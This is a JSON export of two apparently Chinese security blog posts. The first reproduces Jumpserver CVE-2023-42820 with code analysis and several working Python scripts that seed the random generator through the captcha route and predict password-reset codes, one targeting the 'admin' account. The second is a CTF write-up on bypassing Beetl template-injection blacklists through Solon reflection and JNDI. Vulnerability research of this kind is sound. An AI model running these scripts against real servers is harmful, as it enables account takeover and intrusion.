[{"content":"环境 Jumpserver \u0026lt;= v3.6.4中存在CVE-2023-42820漏洞，可以预测随机数导致验证码预测。\n环境搭建\nvulnhub或者官网\n漏洞分析 github diff如下https://github.com/jumpserver/jumpserver/commit/ce645b1710c5821119f313e1b3d801470565aac0\nrandom_string函数用于生成密码重置的验证码，去掉了random的seed，所以代码中应该有地方可以设置可控seed。\njumpserver v3.6.4使用了django-simple-captcha v0.5.18来生成验证码，而此版本中在captcha_image函数中设置了种子，但结束后未将其置空。\n图片验证码逻辑 captcha相关路由如下：\nurlpatterns = [ re_path( r\u0026#34;image/(?P\u0026lt;key\u0026gt;\\w+)/$\u0026#34;, views.captcha_image, name=\u0026#34;captcha-image\u0026#34;, kwargs={\u0026#34;scale\u0026#34;: 1}, ), re_path( r\u0026#34;image/(?P\u0026lt;key\u0026gt;\\w+)@2/$\u0026#34;, views.captcha_image, name=\u0026#34;captcha-image-2x\u0026#34;, kwargs={\u0026#34;scale\u0026#34;: 2}, ), re_path(r\u0026#34;audio/(?P\u0026lt;key\u0026gt;\\w+).wav$\u0026#34;, views.captcha_audio, name=\u0026#34;captcha-audio\u0026#34;), re_path(r\u0026#34;refresh/$\u0026#34;, views.captcha_refresh, name=\u0026#34;captcha-refresh\u0026#34;), ] 验证码刷新代码：\ndef captcha_refresh(request): \u0026#34;\u0026#34;\u0026#34;Return json with new captcha for ajax refresh request\u0026#34;\u0026#34;\u0026#34; if not request.headers.get(\u0026#34;x-requested-with\u0026#34;) == \u0026#34;XMLHttpRequest\u0026#34;: raise Http404 new_key = CaptchaStore.pick() ...... @classmethod def generate_key(cls, generator=None): challenge, response = captcha_settings.get_challenge(generator)() store = cls.objects.create(challenge=challenge, response=response) return store.hashkey @classmethod def pick(cls): if not captcha_settings.CAPTCHA_GET_FROM_POOL: return cls.generate_key() def fallback(): logger.error(\u0026#34;Couldn\u0026#39;t get a captcha from pool, generating\u0026#34;) return cls.generate_key() # Pick up a random item from pool minimum_expiration = timezone.now() + datetime.timedelta( minutes=int(captcha_settings.CAPTCHA_GET_FROM_POOL_TIMEOUT) ) store = ( cls.objects.filter(expiration__gt=minimum_expiration).order_by(\u0026#34;?\u0026#34;).first() ) return (store and store.hashkey) or fallback() CAPTCHA_GET_FROM_POOL默认为False，pick通过get_chanllenge查找生成chal的函数并调用\njumpserver默认有如下设置:\nCAPTCHA_IMAGE_SIZE = (180, 38) CAPTCHA_FOREGROUND_COLOR = \u0026#39;#001100\u0026#39; CAPTCHA_NOISE_FUNCTIONS = (\u0026#39;captcha.helpers.noise_dots\u0026#39;,) CAPTCHA_CHALLENGE_FUNCT = \u0026#39;captcha.helpers.math_challenge\u0026#39; math_challenge用于生成简单的数学计算题。\ndef math_challenge(): operators = (\u0026#34;+\u0026#34;, \u0026#34;*\u0026#34;, \u0026#34;-\u0026#34;) operands = (random.randint(1, 10), random.randint(1, 10)) operator = random.choice(operators) if operands[0] \u0026lt; operands[1] and \u0026#34;-\u0026#34; == operator: operands = (operands[1], operands[0]) challenge = \u0026#34;%d%s%d\u0026#34; % (operands[0], operator, operands[1]) return ( \u0026#34;{}=\u0026#34;.format(challenge.replace(\u0026#34;*\u0026#34;, settings.CAPTCHA_MATH_CHALLENGE_OPERATOR)), str(eval(challenge)), ) 验证码刷新流程为：\n通过math_challenge生成简单算术题 将题目和答案保存 通过store.hashkey生成题目hash，将hash作为key返回 后续可根据此key获取图片。由captcha_image函数生成图片。\ncaptcha_image代码如下：\ndef captcha_image(request, key, scale=1): if scale == 2 and not settings.CAPTCHA_2X_IMAGE: raise Http404 try: store = CaptchaStore.objects.get(hashkey=key) except CaptchaStore.DoesNotExist: # HTTP 410 Gone status so that crawlers don\u0026#39;t index these expired urls. return HttpResponse(status=410) random.seed(key) # Do not generate different images for the same key text = store.challenge if isinstance(settings.CAPTCHA_FONT_PATH, str): fontpath = settings.CAPTCHA_FONT_PATH elif isinstance(settings.CAPTCHA_FONT_PATH, (list, tuple)): fontpath = random.choice(settings.CAPTCHA_FONT_PATH) else: raise ImproperlyConfigured( \u0026#34;settings.CAPTCHA_FONT_PATH needs to be a path to a font or list of paths to fonts\u0026#34; ) if fontpath.lower().strip().endswith(\u0026#34;ttf\u0026#34;): font = ImageFont.truetype(fontpath, settings.CAPTCHA_FONT_SIZE * scale) else: font = ImageFont.load(fontpath) if settings.CAPTCHA_IMAGE_SIZE: size = settings.CAPTCHA_IMAGE_SIZE else: size = getsize(font, text) size = (size[0] * 2, int(size[1] * 1.4)) image = makeimg(size) xpos = 2 charlist = [] for char in text: if char in settings.CAPTCHA_PUNCTUATION and len(charlist) \u0026gt;= 1: charlist[-1] += char else: charlist.append(char) for char in charlist: fgimage = Image.new(\u0026#34;RGB\u0026#34;, size, settings.CAPTCHA_FOREGROUND_COLOR) charimage = Image.new(\u0026#34;L\u0026#34;, getsize(font, \u0026#34; %s \u0026#34; % char), \u0026#34;#000000\u0026#34;) chardraw = ImageDraw.Draw(charimage) chardraw.text((0, 0), \u0026#34; %s \u0026#34; % char, font=font, fill=\u0026#34;#ffffff\u0026#34;) if settings.CAPTCHA_LETTER_ROTATION: charimage = charimage.rotate( random.randrange(*settings.CAPTCHA_LETTER_ROTATION), expand=0, resample=Image.BICUBIC, ) charimage = charimage.crop(charimage.getbbox()) maskimage = Image.new(\u0026#34;L\u0026#34;, size) ...... for f in settings.noise_functions(): draw = f(draw, image) for f in settings.filter_functions(): image = f(image) ...... return response 先将key作为seed传入，后续需要计算random操作调用了多少次，姑且称其为偏移吧。\nsettings.CAPTCHA_FONT_PATH默认有值，不会调用random.choice\n之后会对text也就是算术题进行处理，会调用random.randrange(*settings.CAPTCHA_LETTER_ROTATION)，调用次数不确定。\n在noise_functions()中jumpserver设置为了captcha.helpers.noise_arcs和captcha.helpers.noise_dots，其中captcha.helpers.noise_dots会调用random。代码如下：\ndef noise_dots(draw, image): size = image.size for p in range(int(size[0] * size[1] * 0.1)): draw.point( (random.randint(0, size[0]), random.randint(0, size[1])), fill=settings.CAPTCHA_FOREGROUND_COLOR, ) return draw 图片大小决定seed的偏移。而jumpserver设置了默认图片大小，就是上面提到的CAPTCHA_IMAGE_SIZE = (180, 38)，在captcha_image函数中读取并赋值。\n密码重置验证码逻辑 UserResetPasswordSendCodeApi类定义了验证码逻辑：\ntoken = request.GET.get(\u0026#39;token\u0026#39;) userinfo = cache.get(token) if not userinfo: return HttpResponseRedirect(reverse(\u0026#39;authentication:forgot-previewing\u0026#39;)) serializer = self.get_serializer(data=request.data) serializer.is_valid(raise_exception=True) username = userinfo.get(\u0026#39;username\u0026#39;) form_type = serializer.validated_data[\u0026#39;form_type\u0026#39;] code = random_string(6, lower=False, upper=False) ...... 漏洞利用 想要预测验证码达成以下条件：\n控制seed 可控seed的偏移 控制seed 通过路由/core/auth/captcha/image/{seed}/即可设置seed。需要注意：\n生成图片时会检查此key是否通过refresh生成：\ntry: store = CaptchaStore.objects.get(hashkey=key) except CaptchaStore.DoesNotExist: # HTTP 410 Gone status so that crawlers don\u0026#39;t index these expired urls. return HttpResponse(status=410) 当一个验证码被使用后，对应的key会被删除，如果再次尝试设置seed为此key，会返回410错误，所以key不能复用。\n还有就是jumpserver会有多个进程进行监听，所以需要多次发包设置seed才能使所有进程的seed都被控制，提高成功率。\n计算random调用次数 noise_dots计算噪点以及最终生成code时调用次数都是固定的。不确定的地方是对challenge处理时调用次数会根据challenge内容决定。\n尝试枚举所有可能：\nlens = [] for i in range(1, 11): for l in range(1, 11): for p in [\u0026#39;*\u0026#39;, \u0026#39;-\u0026#39;, \u0026#39;+\u0026#39;]: sum = 0 text = \u0026#39;{}{}{}=\u0026#39;.format(str(i), p, str(l)) charlist = [] for char in text: if char in \u0026#34;_\\\u0026#34;\u0026#39;,.;:-\u0026#34; and len(charlist) \u0026gt;= 1: charlist[-1] += char else: charlist.append(char) for char in charlist: sum = sum + 1 if sum not in lens: lens.append(sum) lens.sort() print(lens) # [3, 4, 5, 6] 计算4次的概率最大。\n半自动利用 利用流程：\n浏览器进入发送验证码页面 在发送验证码之前运行脚本预测验证码 发送验证码 原理：先设置seed，然后用gen_img_flow模拟seed偏移。因为次数为4的概率最大，所以固定为4。此脚本有概率失败大概为30%\n脚本如下：\nimport requests import random import string import re url = \u0026#39;\u0026#39; string_punctuation = \u0026#39;!#$%\u0026amp;()*+,-.:;\u0026lt;=\u0026gt;?@[]^_~\u0026#39; key = None def gen_img_flow(n): CAPTCHA_LETTER_ROTATION = (-35, 35) size = (180, 38) for char in range(n): random.randrange(*CAPTCHA_LETTER_ROTATION) for p in range(int(size[0] * size[1] * 0.1)): random.randint(0, size[0]) random.randint(0, size[1]) def random_string(length: int, lower=True, upper=True, digit=True, special_char=False): args_names = [\u0026#39;lower\u0026#39;, \u0026#39;upper\u0026#39;, \u0026#39;digit\u0026#39;, \u0026#39;special_char\u0026#39;] args_values = [lower, upper, digit, special_char] args_string = [string.ascii_lowercase, string.ascii_uppercase, string.digits, string_punctuation] args_string_map = dict(zip(args_names, args_string)) kwargs = dict(zip(args_names, args_values)) kwargs_keys = list(kwargs.keys()) kwargs_values = list(kwargs.values()) args_true_count = len([i for i in kwargs_values if i]) assert any(kwargs_values), f\u0026#39;Parameters {kwargs_keys} must have at least one `True`\u0026#39; assert length \u0026gt;= args_true_count, f\u0026#39;Expected length \u0026gt;= {args_true_count}, bug got {length}\u0026#39; can_startswith_special_char = args_true_count == 1 and special_char chars = \u0026#39;\u0026#39;.join([args_string_map[k] for k, v in kwargs.items() if v]) while True: password = list(random.choice(chars) for i in range(length)) for k, v in kwargs.items(): if v and not (set(password) \u0026amp; set(args_string_map[k])): # 没有包含指定的字符, retry break else: if not can_startswith_special_char and password[0] in args_string_map[\u0026#39;special_char\u0026#39;]: # 首位不能为特殊字符, retry continue else: # 满足要求终止 while 循环 break password = \u0026#39;\u0026#39;.join(password) return password def set_seed(s : requests.Session): print(\u0026#39;[*] start set seed\u0026#39;) global key if key == None: res = s.get(url=url + \u0026#39;/core/auth/password/forget/previewing/\u0026#39;) try: pattern = r\u0026#39;\\/core\\/auth\\/captcha\\/image\\/([a-f0-9]{40})\\/\u0026#39; key = re.findall(pattern, res.text)[0] except: print(\u0026#39;[-] get key failed\u0026#39;) print(res.text) exit() if len(key) != 40 : print(\u0026#39;[-] key error\u0026#39;) exit() try: for i in range(10): res = s.get(url=url + \u0026#39;/core/auth/captcha/image/{}/\u0026#39;.format(key)) except: pass if __name__ == \u0026#39;__main__\u0026#39;: s = requests.Session() key = None set_seed(s) random.seed(key) gen_img_flow(4) code = random_string(6, lower=False, upper=False) print(code) 提升成功概率的尝试 上面的脚本有概率失败是因为，seed偏移不确定。要提升成功率要从此入手。\n如下图： 需要获取原本seed的值或者chal\n思路一 设置两次seed(不可行) 可以先设置seed1，再设置seed2，这样chal由seed1生成，code由seed2生成。\n看似很合理，但其实不可行，因为如果要通过seed1计算chal，需要知道seed1的偏移，这就又变成要获取在seed1之前的那个未知chal了。\n如图所示： 思路二 chal辅助计算(可行) 在设置seed之后，查看生成的chal，手动输入chal辅助计算。\n如图： 虽说100%准确，但很麻烦，不用chal辅助正确率也能有60%以上了，意义不大。\nimport requests import random import string import re import PIL url = \u0026#39;\u0026#39; string_punctuation = \u0026#39;!#$%\u0026amp;()*+,-.:;\u0026lt;=\u0026gt;?@[]^_~\u0026#39; key = None def gen_img_flow(n): CAPTCHA_LETTER_ROTATION = (-35, 35) size = (180, 38) for char in range(n): random.randrange(*CAPTCHA_LETTER_ROTATION) for p in range(int(size[0] * size[1] * 0.1)): random.randint(0, size[0]) random.randint(0, size[1]) def random_string(length: int, lower=True, upper=True, digit=True, special_char=False): args_names = [\u0026#39;lower\u0026#39;, \u0026#39;upper\u0026#39;, \u0026#39;digit\u0026#39;, \u0026#39;special_char\u0026#39;] args_values = [lower, upper, digit, special_char] args_string = [string.ascii_lowercase, string.ascii_uppercase, string.digits, string_punctuation] args_string_map = dict(zip(args_names, args_string)) kwargs = dict(zip(args_names, args_values)) kwargs_keys = list(kwargs.keys()) kwargs_values = list(kwargs.values()) args_true_count = len([i for i in kwargs_values if i]) assert any(kwargs_values), f\u0026#39;Parameters {kwargs_keys} must have at least one `True`\u0026#39; assert length \u0026gt;= args_true_count, f\u0026#39;Expected length \u0026gt;= {args_true_count}, bug got {length}\u0026#39; can_startswith_special_char = args_true_count == 1 and special_char chars = \u0026#39;\u0026#39;.join([args_string_map[k] for k, v in kwargs.items() if v]) while True: password = list(random.choice(chars) for i in range(length)) for k, v in kwargs.items(): if v and not (set(password) \u0026amp; set(args_string_map[k])): # 没有包含指定的字符, retry break else: if not can_startswith_special_char and password[0] in args_string_map[\u0026#39;special_char\u0026#39;]: # 首位不能为特殊字符, retry continue else: # 满足要求终止 while 循环 break password = \u0026#39;\u0026#39;.join(password) return password def set_seed(s : requests.Session): print(\u0026#39;[*] start set seed\u0026#39;) global key if key == None: res = s.get(url=url + \u0026#39;/core/auth/password/forget/previewing/\u0026#39;) try: pattern = r\u0026#39;\\/core\\/auth\\/captcha\\/image\\/([a-f0-9]{40})\\/\u0026#39; key = re.findall(pattern, res.text)[0] except: print(\u0026#39;[-] get key failed\u0026#39;) print(res.text) exit() if len(key) != 40 : print(\u0026#39;[-] key error\u0026#39;) exit() try: for i in range(10): res = s.get(url=url + \u0026#39;/core/auth/captcha/image/{}/\u0026#39;.format(key)) if i == 0: f = open(\u0026#39;./out/out.png\u0026#39;.format(str(i)), \u0026#39;wb\u0026#39;) f.write(res.content) f.close() except: pass if __name__ == \u0026#39;__main__\u0026#39;: s = requests.Session() key = None set_seed(s) img = PIL.Image.open(\u0026#39;./out/out.png\u0026#39;) img.show() chal = input(\u0026#34;chal : \u0026#34;).replace(\u0026#39;\\n\u0026#39;, \u0026#39;\u0026#39;) random.seed(key) CAPTCHA_LETTER_ROTATION = (-35, 35) charlist = [] for char in chal: if char == \u0026#34;-\u0026#34; and len(charlist) \u0026gt;= 1: charlist[-1] += char else: charlist.append(char) for char in range(4): random.randrange(*CAPTCHA_LETTER_ROTATION) gen_img_flow(0) code = random_string(6, lower=False, upper=False) print(code) 思路三 自动校准偏移(不可行) 流程如下：\n先设置seed1 访问/core/auth/password/forget/previewing/路由刷新验证码，此时seed变为seed2，chal由seed1生成。 枚举由seed1生成的chal的四种可能，选择可能性最高尝试提交form。使用while 循环重复1-3步骤。如果验证码检验通过则break。 循环break说明seed2和chal均确定，此时可以准确计算code了。 验证码通过就代表偏移设置为4的情况生成的chal是正确的。\n流程图： 此时可以看到一个问题，如果要校准seed2的偏移必须要提交form通过验证码检验，但上文中的代码审计得知，一个seed对应的chal使用过一次就不能再用了，所以重新设置seed2会失败，返回410错误：\ntry: store = CaptchaStore.objects.get(hashkey=key) except CaptchaStore.DoesNotExist: # HTTP 410 Gone status so that crawlers don\u0026#39;t index these expired urls. return HttpResponse(status=410) 所以这个方法不可行。不过还是把脚本贴上来吧：\nimport requests import random import string import re url = \u0026#39;\u0026#39; string_punctuation = \u0026#39;!#$%\u0026amp;()*+,-.:;\u0026lt;=\u0026gt;?@[]^_~\u0026#39; key = None def gen_img_flow(n): CAPTCHA_LETTER_ROTATION = (-35, 35) size = (180, 38) for char in range(n): random.randrange(*CAPTCHA_LETTER_ROTATION) for p in range(int(size[0] * size[1] * 0.1)): random.randint(0, size[0]) random.randint(0, size[1]) def math_challenge(): operators = (\u0026#34;+\u0026#34;, \u0026#34;*\u0026#34;, \u0026#34;-\u0026#34;) operands = (random.randint(1, 10), random.randint(1, 10)) operator = random.choice(operators) if operands[0] \u0026lt; operands[1] and \u0026#34;-\u0026#34; == operator: operands = (operands[1], operands[0]) challenge = \u0026#34;%d%s%d\u0026#34; % (operands[0], operator, operands[1]) return ( \u0026#34;{}=\u0026#34;.format(challenge.replace(\u0026#34;*\u0026#34;, \u0026#34;*\u0026#34;)), str(eval(challenge)), ) def random_string(length: int, lower=True, upper=True, digit=True, special_char=False): args_names = [\u0026#39;lower\u0026#39;, \u0026#39;upper\u0026#39;, \u0026#39;digit\u0026#39;, \u0026#39;special_char\u0026#39;] args_values = [lower, upper, digit, special_char] args_string = [string.ascii_lowercase, string.ascii_uppercase, string.digits, string_punctuation] args_string_map = dict(zip(args_names, args_string)) kwargs = dict(zip(args_names, args_values)) kwargs_keys = list(kwargs.keys()) kwargs_values = list(kwargs.values()) args_true_count = len([i for i in kwargs_values if i]) assert any(kwargs_values), f\u0026#39;Parameters {kwargs_keys} must have at least one `True`\u0026#39; assert length \u0026gt;= args_true_count, f\u0026#39;Expected length \u0026gt;= {args_true_count}, bug got {length}\u0026#39; can_startswith_special_char = args_true_count == 1 and special_char chars = \u0026#39;\u0026#39;.join([args_string_map[k] for k, v in kwargs.items() if v]) while True: password = list(random.choice(chars) for i in range(length)) for k, v in kwargs.items(): if v and not (set(password) \u0026amp; set(args_string_map[k])): # 没有包含指定的字符, retry break else: if not can_startswith_special_char and password[0] in args_string_map[\u0026#39;special_char\u0026#39;]: # 首位不能为特殊字符, retry continue else: # 满足要求终止 while 循环 break password = \u0026#39;\u0026#39;.join(password) return password def set_seed(s : requests.Session): print(\u0026#39;[*] start set seed\u0026#39;) global key if key == None: res = s.get(url=url + \u0026#39;/core/auth/password/forget/previewing/\u0026#39;) try: pattern = r\u0026#39;\\/core\\/auth\\/captcha\\/image\\/([a-f0-9]{40})\\/\u0026#39; key = re.findall(pattern, res.text)[0] except: print(\u0026#39;[-] get key failed\u0026#39;) print(res.text) exit() if len(key) != 40 : print(\u0026#39;[-] key error\u0026#39;) exit() try: for i in range(10): res = s.get(url=url + \u0026#39;/core/auth/captcha/image/{}/\u0026#39;.format(key)) except: pass def get_reset_page_1(s : requests.Session) -\u0026gt; tuple[str, str]: print(\u0026#34;[*] start to get captcha0\u0026#34;) res = s.get(url=url + \u0026#39;/core/auth/password/forget/previewing/\u0026#39;) key_pattern = r\u0026#39;\\/core\\/auth\\/captcha\\/image\\/([a-f0-9]{40})\\/\u0026#39; csrf_token_pattern = r\u0026#39;name=\u0026#34;csrfmiddlewaretoken\u0026#34; value=\u0026#34;(.*)\u0026#34;\u0026#39; try: key = re.findall(key_pattern, res.text)[0] csrf_token = re.findall(csrf_token_pattern, res.text)[0] if len(key) == 40 and len(csrf_token) \u0026gt; 0: print(\u0026#34;[+] get captcha0 success\u0026#34;) return (key, csrf_token) except Exception as e: print(e) print(\u0026#34;[-] get captcha0 failed\u0026#34;) exit() def send_captcha(s : requests.Session, captcha_0 : str, captcha_1 : str, csrf_token : str) -\u0026gt; str: data = { \u0026#34;csrfmiddlewaretoken\u0026#34; : csrf_token, \u0026#34;username\u0026#34; : \u0026#34;admin\u0026#34;, \u0026#34;captcha_0\u0026#34; : captcha_0, \u0026#34;captcha_1\u0026#34; : captcha_1 } res = s.post(url=url + \u0026#39;/core/auth/password/forget/previewing/\u0026#39;, data=data, allow_redirects=False) if res.status_code == 302: token = res.headers.get(\u0026#34;Location\u0026#34;).split(\u0026#34;token=\u0026#34;)[-1] if len(token) \u0026gt; 0: return token return None if __name__ == \u0026#39;__main__\u0026#39;: while True: key = None s = requests.session() set_seed(s) # set seed + gen_img_flow captcha0_key, captcha0_csrf_token = get_reset_page_1(s) random.seed(key) gen_img_flow(4) chal, answer = math_challenge() token = send_captcha(s, captcha0_key, str(answer), captcha0_csrf_token) if token != None: break else: print(\u0026#34;captcha incorrect\u0026#34;) key = captcha0_key set_seed(s) random.seed(key) CAPTCHA_LETTER_ROTATION = (-35, 35) charlist = [] for char in chal: if char == \u0026#34;-\u0026#34; and len(charlist) \u0026gt;= 1: charlist[-1] += char else: charlist.append(char) for char in range(4): random.randrange(*CAPTCHA_LETTER_ROTATION) gen_img_flow(0) code = random_string(6, lower=False, upper=False) print(code) ","permalink":"https://zoiltin.github.io/posts/jumpserver%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%A2%84%E6%B5%8B%E6%BC%8F%E6%B4%9Ecve-2023-42820%E5%A4%8D%E7%8E%B0/","summary":"环境 Jumpserver \u0026lt;= v3.6.4中存在CVE-2023-42820漏洞，可以预测随机数导致验证码预测。\n环境搭建\nvulnhub或者官网\n漏洞分析 github diff如下https://github.com/jumpserver/jumpserver/commit/ce645b1710c5821119f313e1b3d801470565aac0\nrandom_string函数用于生成密码重置的验证码，去掉了random的seed，所以代码中应该有地方可以设置可控seed。\njumpserver v3.6.4使用了django-simple-captcha v0.5.18来生成验证码，而此版本中在captcha_image函数中设置了种子，但结束后未将其置空。\n图片验证码逻辑 captcha相关路由如下：\nurlpatterns = [ re_path( r\u0026#34;image/(?P\u0026lt;key\u0026gt;\\w+)/$\u0026#34;, views.captcha_image, name=\u0026#34;captcha-image\u0026#34;, kwargs={\u0026#34;scale\u0026#34;: 1}, ), re_path( r\u0026#34;image/(?P\u0026lt;key\u0026gt;\\w+)@2/$\u0026#34;, views.captcha_image, name=\u0026#34;captcha-image-2x\u0026#34;, kwargs={\u0026#34;scale\u0026#34;: 2}, ), re_path(r\u0026#34;audio/(?P\u0026lt;key\u0026gt;\\w+).wav$\u0026#34;, views.captcha_audio, name=\u0026#34;captcha-audio\u0026#34;), re_path(r\u0026#34;refresh/$\u0026#34;, views.captcha_refresh, name=\u0026#34;captcha-refresh\u0026#34;), ] 验证码刷新代码：\ndef captcha_refresh(request): \u0026#34;\u0026#34;\u0026#34;Return json with new captcha for ajax refresh request\u0026#34;\u0026#34;\u0026#34; if not request.headers.get(\u0026#34;x-requested-with\u0026#34;) == \u0026#34;XMLHttpRequest\u0026#34;: raise Http404 new_key = CaptchaStore.pick() ...... @classmethod def generate_key(cls, generator=None): challenge, response = captcha_settings.get_challenge(generator)() store = cls.","title":"Jumpserver随机数预测漏洞(CVE-2023-42820)复现"},{"content":"本篇文章仅用于技术交流学习和研究的目的，严禁使用文章中的技术用于非法目的和破坏。\n前言 拿到了前段时间ciscn 2024 final的web题附件，来复现一下Fobee这道题，顺便学习一下beetl的模板注入。\n3.15.x及以前的版本 过滤的很少，随便绕过。贴几个公开的poc： https://gitee.com/xiandafu/beetl/issues/I6RUIP https://gitee.com/xiandafu/beetl/issues/I914H3\n3.16.0 3.16.0是题目使用的版本也是本文使用的版本。\n测试环境为java8u65， beetl 3.16.0， solon 2.8.5\n入口 @Mapping(\u0026#34;/render\u0026#34;) public ModelAndView render(String pass, String tp) throws Exception { ModelAndView model = new ModelAndView(\u0026#34;render.htm\u0026#34;); if (pass != null \u0026amp;\u0026amp; pass.equals(password)) { byte[] decode = Base64.getDecoder().decode(tp); String result = BeetlKit.render(new String(decode), new HashMap()); System.out.println(result); model.put(\u0026#34;msg\u0026#34;, getMD5Hash(result)); } else { model.put(\u0026#34;msg\u0026#34;, \u0026#34;Render Page\u0026#34;); } return model; } 渲染过程 由renderTo进入execute函数。然后遍历所有要执行的语句然后依次执行。 每条语句的具体执行代码在org.beetl.core.statement.NativeCallExpression#evaluate函数。\npublic Object evaluate(Context ctx) { Class targetCls = null; Object targetObj = null; NativeNode lastNode = null; if (insNode != null) { targetObj = insNode.ref.evaluate(ctx); if (targetObj != null) { targetCls = targetObj.getClass(); } lastNode = insNode; } else { targetCls = ctx.gt.loadClassBySimpleName(this.clsNode.clazz); if (targetCls == null) { throw new BeetlException(BeetlException.NATIVE_CALL_EXCEPTION, \u0026#34;该类不存在\u0026#34;) .pushToken(GrammarToken.createToken(clsNode.clazz, token.line)); } lastNode = clsNode; } for (NativeNode node : chain) { ... ... } else if (node instanceof NativeMethodNode) { NativeMethodNode methodNode = (NativeMethodNode) node; String method = methodNode.method; Expression[] expList = methodNode.params; this.checkPermit(ctx, targetCls, targetObj, method); Object[] args = expList.length == 0 ? ObjectUtil.EMPTY_OBJECT_ARRAY : new Object[expList.length]; Class[] parameterType = new Class[args.length]; for (int i = 0; i \u0026lt; expList.length; i++) { args[i] = expList[i].evaluate(ctx); parameterType[i] = args[i] == null ? null : args[i].getClass(); } this.checkNull(targetCls, lastNode); ObjectMethodMatchConf mf = ObjectUtil.findMethod(targetCls, method, parameterType); if (mf == null) { throw new BeetlException(BeetlParserException.NATIVE_CALL_INVALID, \u0026#34;根据参数未找到匹配的方法\u0026#34; + method + BeetlUtil.getParameterDescription(parameterType)) .pushToken(GrammarToken.createToken(token.text, token.line)); } if (targetObj == null \u0026amp;\u0026amp; !Modifier.isStatic(mf.method.getModifiers())) { throw new BeetlException(BeetlException.NULL) .pushToken(GrammarToken.createToken(token.text, token.line)); } try { if(mf.contextRequired){ ArrayList tempList = new ArrayList(Arrays.asList(args)); tempList.add(ctx); args = tempList.toArray(); } targetObj = ObjectUtil.invoke(targetObj, mf, args); targetCls = targetObj == null ? null : targetObj.getClass(); ... ... } lastNode = node; } return targetObj; } 黑名单主要针对方法调用，其他代码省略。\nbeetl将每条语句拆分为targetCls，targetObj，method和args。在org.beetl.core.DefaultNativeSecurityManager#permit函数中对targetCls进行检查：\npublic boolean permit(Object resourceId, Class c, Object target, String method) { if (c.isArray()) { // 允许调用，但实际上会在在其后调用中报错。不归此处管理 return true; } String name = c.getName(); String className = null; String pkgName = null; int i = name.lastIndexOf(\u0026#39;.\u0026#39;); if (i != -1) { pkgName = name.substring(0, i); className = name.substring(i + 1); } else { // 无包名，允许调用 return true; } if (pkgName.startsWith(\u0026#34;java.lang.reflect\u0026#34;)) { //反射类，不允许调用 https://gitee.com/xiandafu/beetl/issues/I8RU01 return false; } if (pkgName.startsWith(\u0026#34;java.lang\u0026#34;)) { return !className.equals(\u0026#34;Runtime\u0026#34;) \u0026amp;\u0026amp; !className.equals(\u0026#34;Process\u0026#34;) \u0026amp;\u0026amp; !className.equals(\u0026#34;ProcessBuilder\u0026#34;) \u0026amp;\u0026amp; !className.equals(\u0026#34;Thread\u0026#34;) // https://gitee.com/xiandafu/beetl/issues/I6RUIP \u0026amp;\u0026amp; !className.equals(\u0026#34;Class\u0026#34;) //https://gitee.com/xiandafu/beetl/issues/I6RUIP#note_17223442 \u0026amp;\u0026amp; !className.equals(\u0026#34;System\u0026#34;) ; } if(pkgName.startsWith(\u0026#34;java.beans\u0026#34;)){ //https://gitee.com/xiandafu/beetl/issues/I914H3#note_24939039 return false; } if(pkgName.startsWith(\u0026#34;org.beetl\u0026#34;)){ //https://gitee.com/xiandafu/beetl/issues/I6RUIP return false; } if(pkgName.startsWith(\u0026#34;javax.\u0026#34;)){ return false; } if(pkgName.startsWith(\u0026#34;sun.\u0026#34;)){ return false; } return true; } 在此处执行getRuntime时targetCls为java.lang.Runtime，pkgName位java.lang，被限制了，check不通过。 如果check通过，会解析参数并invoke对应函数：\ntargetObj = ObjectUtil.invoke(targetObj, mf, args); 出网利用 没办法直接利用，尝试从solon和beetl代码中找找可利用的类。\norg.noear.solon.Utils类中有两个静态方法与反射有关：\npublic static Class\u0026lt;?\u0026gt; loadClass(String className) { return ClassUtil.loadClass(className); } public static \u0026lt;T\u0026gt; T newInstance(String className) { return ClassUtil.tryInstance(className); } 通过这两个方法可以实例化任意类。\nJdbcRowSetImpl没被过滤，可以尝试jndi注入。\n不出网利用 newInstance部分绕过了，还差invoke部分。\norg.noear.solon.core.wrap.MethodWrap类中实现了invoke功能：\npublic Object invoke(Object obj, Object[] args) throws Throwable { try { return method.invoke(obj, args); } catch (InvocationTargetException e) { Throwable e2 = e.getTargetException(); throw Utils.throwableUnwrap(e2); } } org.noear.solon.core.AppContext#methodGet会对method进行包装：\npublic MethodWrap methodGet(Method method) { MethodWrap mw = methodCached.get(method); if (mw == null) { SYNC_LOCK.lock(); try { mw = methodCached.get(method); if (mw == null) { mw = new MethodWrap(this, method); methodCached.put(method, mw); } } finally { SYNC_LOCK.unlock(); } } return mw; } @org.noear.solon.Solon.app().context()可以获取上下文，也就是Appcontext对象。\n要包装函数需要先获得Method对象。 org.noear.solon.core.util.ReflectUtil#getDeclaredMethods可以获得所有声明方法。\npublic static Method[] getDeclaredMethods(Class\u0026lt;?\u0026gt; clazz) { return global.getDeclaredMethods(clazz); } 这样就可以调用任意类的任意public函数了。\n回显 org.noear.solon.core.handle.ContextUtil#current可获取当前线程的上下文，这里的context和appcontext不一样，此处的context只包含本次请求的请求包和返回包等内容。\npublic static Context current(){ Context tmp = threadLocal.get(); if (tmp == null \u0026amp;\u0026amp; Solon.cfg().testing()) { tmp = new ContextEmpty(); threadLocal.set(tmp); } return tmp; } solon使用的是smarthttp。smhttpctx对象有一个output函数用来向返回包写数据。 org.noear.solon.boot.smarthttp.http.SmHttpContext#output\npublic void output(byte[] bytes) { try { OutputStream out = this.outputStream(); if (this._allows_write) { out.write(bytes); } } catch (Throwable var3) { throw new RuntimeException(var3); } } 将数据写入byte[]中再代用output就可以回显了。 getInputStream()获得执行结果的inputstream对象，byte[]对象通过反射Array获得。\n结尾 目前beetl的3.17.0版本已经默认使用白名单模式 链接\n","permalink":"https://zoiltin.github.io/posts/ciscn2024-final-fobee-wp/","summary":"本篇文章仅用于技术交流学习和研究的目的，严禁使用文章中的技术用于非法目的和破坏。\n前言 拿到了前段时间ciscn 2024 final的web题附件，来复现一下Fobee这道题，顺便学习一下beetl的模板注入。\n3.15.x及以前的版本 过滤的很少，随便绕过。贴几个公开的poc： https://gitee.com/xiandafu/beetl/issues/I6RUIP https://gitee.com/xiandafu/beetl/issues/I914H3\n3.16.0 3.16.0是题目使用的版本也是本文使用的版本。\n测试环境为java8u65， beetl 3.16.0， solon 2.8.5\n入口 @Mapping(\u0026#34;/render\u0026#34;) public ModelAndView render(String pass, String tp) throws Exception { ModelAndView model = new ModelAndView(\u0026#34;render.htm\u0026#34;); if (pass != null \u0026amp;\u0026amp; pass.equals(password)) { byte[] decode = Base64.getDecoder().decode(tp); String result = BeetlKit.render(new String(decode), new HashMap()); System.out.println(result); 